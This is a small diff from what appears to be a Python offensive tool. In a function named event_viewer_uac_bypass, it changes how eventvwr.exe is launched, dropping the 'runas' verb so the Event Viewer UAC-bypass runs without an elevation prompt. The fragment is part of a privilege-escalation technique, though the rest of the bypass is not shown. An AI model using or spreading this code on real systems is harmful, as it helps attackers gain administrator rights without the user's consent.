@@ -31,7 +31,7 @@ def event_viewer_uac_bypass():
 		sys.exit()
 		
 	try:
-		win32api.ShellExecute(0, "runas","c:\windows\system32\eventvwr.exe", None, None, win32con.SW_SHOW)
+		win32api.ShellExecute(0,None,"c:\windows\system32\eventvwr.exe",None,None,win32con.SW_SHOW)
 	except Exception as error:
 		sys.exit()
 	
